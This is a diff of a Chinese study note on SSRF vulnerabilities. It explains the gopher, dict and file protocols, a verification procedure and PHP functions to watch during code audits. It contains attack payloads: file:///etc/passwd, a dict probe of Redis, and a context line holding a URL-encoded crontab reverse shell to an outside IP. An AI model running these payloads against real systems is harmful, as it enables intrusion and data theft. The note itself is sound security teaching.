@@ -5,15 +5,13 @@
 
 ## SSRF简介
 
-SSRF(server-site request forge，**服务端请求伪造**)是一种请求伪造，由服务器发起请求的安全漏洞。我们的目的是获取内网中资源，但是由于外网访问不了内网的资源，于是就通过服务器去请求内网资源
+SSRF(server-site request forge，**服务端请求伪造**)是一种请求伪造，由服务器发起请求的安全漏洞。一般情况下，SSRF攻击的目标是**从外网无法访问的内部系统**。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
 
 
 
 ### 漏洞原理
 
-服务器端提供里从其他服务器应用获取数据的功能且没有对目标的地址进行过滤和限制。如常见的从指定URL地址加载图片、文本资源或获取指定页面的网页内容等。
-
-通常是**由于**攻击者构造的payload传递给服务器，服务端传回的payload未做任何处理直接执行造成的。
+大部分原因都是服务端提供从其他服务器应用获取数据的功能且没有对目标地址进行过滤和限制。如常见的从指定URL地址加载图片、文本资源或获取指定页面的网页内容等。
 
 
 
@@ -26,14 +24,15 @@ SSRF(server-site request forge，**服务端请求伪造**)是一种请求伪造
 
 ## SSRF危害
 
-1. 获取内网主机、端口和banner信息
-2. 对内容的应用程序进行攻击，如Redis，jboss等
-3. 使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
+1. 获取内网主机、端口和banner信息(内网端口和服务扫描)
+2. 对内外网追击的应用程序进行攻击，如Redis，jboss等
+3. (主机本地敏感数据的读取)使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
    1.  通过dict协议获取服务器端口运行的服务：dict://127.0.0.1:80
    2. 通过file协议访问计算机中的任意文件：file:///etc/passwd 
    3. sftp代表SSH文件传输协议，tftp即简单文件传输协议，允许客户端从远程主机获取文件
 4. 可以攻击内网程序造成溢出
 5. DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
+6. 内外网外部站点漏洞利用
 
 
 
@@ -121,6 +120,52 @@ curl -v
 
 
 
+#### Gopher协议
+
+> 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。
+
+- Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议
+- Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用
+- 利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求
+- Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。
+
+
+
+**gopher协议格式：**
+
+```bash
+gopher://<host>:<port>/<gopher-path>_后接TCP数据流
+```
+
+如：
+
+```bash
+curl gopher://localhost:2222/hello%0agopher
+```
+
+
+
+
+
+#### dict
+
+词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。
+
+```bash
+curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info
+
+```
+
+
+
+如果服务端有屏蔽回显的代码，那么这种回显方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据
+
+
+
+#### file
+
+本地文件传输协议，主要用于访问本地计算机中的文件
+
 
 
 ### 302 SSRF
@@ -184,14 +229,9 @@ a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1
 
 #### gopher协议
 
-- Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议
-- Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用
-- 利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求
-- Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。
+#### 
 
-#### **比如：**
-
-存在ssrf的漏洞地址为：`http://192.168.1.11/ssrf.php?url=`
+比如存在ssrf的漏洞地址为：`http://192.168.1.11/ssrf.php?url=`
 
 结合gother协议构造符合格式的paylod，从而模拟redis通信
 
@@ -365,6 +405,27 @@ xip.io可以指向任意域名，即
 
 #### 11.DNSlog无回显注入
 
+- 使用dhsnlog平台/自己搭建
+
+- 打开apache或者nginx，测试地址修改为web服务地址，然后看日志`ail -f /var/log/apache2/access.log`
+
+- 使用tcpdump
+
+  ```bash
+  tcpdump -nne -i eth0 port 6666
+  
+  # -nne：不把端口和网络地址转换成名称，在输出行打印数据链路层的头部信息；
+  # -i：监视指定网络接口的数据包。
+  
+  
+  ```
+
+  
+
+
+
+
+
 
 
 #### 12.加端口
@@ -385,6 +446,28 @@ http://127.0.0.1:8080
 
 
 
+## 简单验证流程
+
+> 之前由于疏忽了，看到dnslog回显就认为是ssrf，大意了忘了SSRF是服务端发起请求.....(有时候dnslog回显的可能是你本地的ip)
+
+
+
+假设对于如下链接：
+
+`http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png`
+
+1. **我们先验证，请求是否是服务器端发出的**，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是`http://www.baidu.com/img/bd_logo1.png`，说明不存在SSRF漏洞。
+2. 可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含`http://www.baidu.com/img/bd_logo1.png`这个请求。**由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。**
+3. 在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，**接下来需要验证此URL是否可以来请求对应的内网地址**。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。
+
+
+
+
+
+
+
+
+
 ## SSRF漏洞代码审计
 
 
@@ -394,9 +477,10 @@ http://127.0.0.1:8080
 PHP中下面函数的使用不当会导致SSRF:
 
 ```php
-curl()
-file_get_contents()	# 获取文档数据
-fsockopen()	#  初始化一个套接字连接到指定主机
+curl()  # 利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透
+file_get_contents()	# 获取文档数据,file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。
+  
+fsockopen()	#  初始化一个套接字连接到指定主机,本身就是打开一个网络连接或者Unix套接字连接。
 curl_exec()	#  获得curl会话的结果
 ```
 
@@ -470,6 +554,7 @@ ImageIO.read()
 
 https://zhuanlan.zhihu.com/p/73736127
 
+https://www.cnblogs.com/chalan630/p/17090666.html
 
 
 ---
